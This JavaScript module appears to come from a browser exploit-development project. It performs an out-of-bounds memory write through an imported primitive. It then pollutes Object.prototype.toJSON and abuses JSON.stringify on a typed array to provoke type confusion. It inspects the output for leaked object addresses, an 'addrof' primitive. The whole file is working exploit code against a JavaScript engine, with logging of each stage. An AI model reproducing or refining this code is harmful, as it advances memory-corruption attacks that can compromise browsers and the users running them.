// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v27_TargetConfusedMarkerForLeak)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V27_TCML = "OriginalHeisenbug_TypedArrayAddrof_v27_TargetConfusedMarkerForLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let object_to_leak_A_v27 = null;
let object_to_leak_B_v27 = null;
let victim_typed_array_ref_v27 = null; 
let probe_call_count_v27 = 0;
let last_probe_details_v27 = null; 
let marker_object_P1_v27 = null; // Objeto retornado pela Call #1

const PROBE_CALL_LIMIT_V27 = 5; 

function toJSON_TA_Probe_TargetMarkerLeak() {
    probe_call_count_v27++;
    const call_num = probe_call_count_v27;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v27_TargetConfusedMarkerForLeak",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v27),
        this_is_marker_P1: (this === marker_object_P1_v27 && marker_object_P1_v27 !== null),
        writes_to_marker_P1_attempted: false,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsMarkerP1? ${current_call_details.this_is_marker_P1}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V27) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit. Returning stop object.`, "warn");
            last_probe_details_v27 = current_call_details;
            return { recursion_stopped_v27: true };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Returning new marker_object_P1_v27.`, "info");
            marker_object_P1_v27 = { 
                marker_id_v27: "MARKER_P1_V27_PAYLOAD",
                payload_A: null, 
                payload_B: null 
            };
            last_probe_details_v27 = current_call_details;
            return marker_object_P1_v27; // Este objeto será o stringifyOutput
        } else if (current_call_details.this_is_marker_P1) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS marker_object_P1_v27. Current type: ${current_call_details.this_type}`, "info");
            if (current_call_details.this_type === '[object Object]') { 
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON MARKER_P1 ('this')! Attempting writes to its payload...`, "vuln");
                if (object_to_leak_A_v27) this.payload_A = object_to_leak_A_v27;
                if (object_to_leak_B_v27) this.payload_B = object_to_leak_B_v27;
                current_call_details.writes_to_marker_P1_attempted = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Writes to marker_P1 'this' payload attempted. Keys: ${Object.keys(this).join(',')}`, "info");
            } else {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: marker_object_P1_v27 ('this') is NOT [object Object]. Type: ${current_call_details.this_type}`, "warn");
            }
            last_probe_details_v27 = current_call_details;
            return this; // Retornar o marker_P1 (potencialmente modificado) para que seja serializado no stringifyOutput
        } else {
            // Outras chamadas inesperadas, ou o this confuso é um objeto genérico
             if (current_call_details.this_type === '[object Object]') {
                 logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an unexpected [object Object]. No specific action.`, "warn");
             }
        }
    } catch (e) {
        current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `ProbeErr: ${e.name}: ${e.message}`;
    }
    
    last_probe_details_v27 = current_call_details;
    // Retorno genérico para outras chamadas não previstas
    return { generic_marker_v27: call_num }; 
}

export async function executeTypedArrayVictimAddrofTest_TargetConfusedMarkerForLeak() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V27_TCML}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (TargetConfusedMarkerForLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V27_TCML} Init...`;

    probe_call_count_v27 = 0;
    last_probe_details_v27 = null; 
    victim_typed_array_ref_v27 = null; 
    marker_object_P1_v27 = null; // Reset
    object_to_leak_A_v27 = { marker: "ObjA_TA_v27tcml", id: Date.now() }; 
    object_to_leak_B_v27 = { marker: "ObjB_TA_v27tcml", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let captured_last_probe_details_final = null;
    
    let addrof_Victim_A = { success: false, msg: "VictimA: Buffer unchanged." }; // Não esperamos mudar
    let addrof_Marker_A = { success: false, msg: "Marker.payload_A: Default"};
    let addrof_Marker_B = { success: false, msg: "Marker.payload_B: Default"};

    const fillPattern = 0.27272727272727;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v27 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v27.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v27 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_TargetMarkerLeak, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v27); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); // Este é o nosso principal alvo para addrof
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput };
            }
            
            if (last_probe_details_v27) {
                captured_last_probe_details_final = JSON.parse(JSON.stringify(last_probe_details_v27)); 
            }
            logS3(`  EXECUTE: Captured details of LAST probe run: ${captured_last_probe_details_final ? JSON.stringify(captured_last_probe_details_final) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnMarkerP1 = false; // Se o marker_object_P1_v27 (que se tornou 'this') foi confundido
            if (captured_last_probe_details_final && 
                captured_last_probe_details_final.this_is_marker_P1 &&
                captured_last_probe_details_final.this_type === "[object Object]") {
                heisenbugOnMarkerP1 = true;
            }
            logS3(`  EXECUTE: Heisenbug on Marker P1 ${heisenbugOnMarkerP1 ? "CONFIRMED" : "NOT Confirmed"}. Details: ${captured_last_probe_details_final ? captured_last_probe_details_final.this_type : 'N/A'}`, heisenbugOnMarkerP1 ? "vuln" : "error", FNAME_CURRENT_TEST);
                
            logS3("STEP 3: Checking victim buffer (expected unchanged)...", "warn", FNAME_CURRENT_TEST);
            if (float64_view_on_victim_buffer[0] !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${float64_view_on_victim_buffer[0]}`;
            
            logS3("STEP 4: Checking stringifyOutput_parsed (the P1 marker object) for leaked properties...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.marker_id_v27 === "MARKER_P1_V27_PAYLOAD") {
                logS3("  stringifyOutput_parsed IS the P1 marker object.", "info");
                const marker_payload_A_val = stringifyOutput_parsed.payload_A;
                if (typeof marker_payload_A_val === 'number' && marker_payload_A_val !==0) {
                    let mkr_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([marker_payload_A_val]).buffer)[0], new Uint32Array(new Float64Array([marker_payload_A_val]).buffer)[1]);
                    if (mkr_A_int64.high() < 0x00020000 || (mkr_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Marker_A.success = true; addrof_Marker_A.msg = `Possible pointer for payload_A in P1 marker: ${mkr_A_int64.toString(true)}`;
                    } else { addrof_Marker_A.msg = `P1.payload_A is num but not ptr: ${marker_payload_A_val}`; }
                } else if (marker_payload_A_val === object_to_leak_A_v27) {
                     addrof_Marker_A.success = true; addrof_Marker_A.msg = "object_to_leak_A_v27 identity in P1.payload_A.";
                } else { addrof_Marker_A.msg = `P1.payload_A not ptr. Val: ${marker_payload_A_val}`; }

                const marker_payload_B_val = stringifyOutput_parsed.payload_B;
                if (typeof marker_payload_B_val === 'number' && marker_payload_B_val !==0) {
                    let mkr_B_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([marker_payload_B_val]).buffer)[0], new Uint32Array(new Float64Array([marker_payload_B_val]).buffer)[1]);
                     if (mkr_B_int64.high() < 0x00020000 || (mkr_B_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_Marker_B.success = true; addrof_Marker_B.msg = `Possible pointer for payload_B in P1 marker: ${mkr_B_int64.toString(true)}`;
                    } else { addrof_Marker_B.msg = `P1.payload_B is num but not ptr: ${marker_payload_B_val}`; }
                } else if (marker_payload_B_val === object_to_leak_B_v27) {
                     addrof_Marker_B.success = true; addrof_Marker_B.msg = "object_to_leak_B_v27 identity in P1.payload_B.";
                } else { addrof_Marker_B.msg = `P1.payload_B not ptr. Val: ${marker_payload_B_val}`; }
            } else {
                addrof_Marker_A.msg = "stringifyOutput was not the P1 marker object or was null/error.";
                addrof_Marker_B.msg = "stringifyOutput was not the P1 marker object or was null/error.";
                 logS3(`  stringifyOutput type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_Marker_A.success || addrof_Marker_B.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V27_TCML}: AddrInP1Marker SUCCESS!`;
            } else if (heisenbugOnMarkerP1) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V27_TCML}: P1MarkerTC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V27_TCML}: No P1MarkerTC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V27_TCML}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V27_TCML} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v27}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: ${addrof_Victim_A.msg}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Marker A: Success=${addrof_Marker_A.success}, Msg='${addrof_Marker_A.msg}'`, addrof_Marker_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof Marker B: Success=${addrof_Marker_B.success}, Msg='${addrof_Marker_B.msg}'`, addrof_Marker_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v27 = null; 
        last_probe_details_v27 = null;
        marker_object_P1_v27 = null;
        probe_call_count_v27 = 0;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: captured_last_probe_details_final, 
        total_probe_calls: probe_call_count_v27,
        addrof_marker_A: addrof_Marker_A, // Foco nestes
        addrof_marker_B: addrof_Marker_B
    };
}
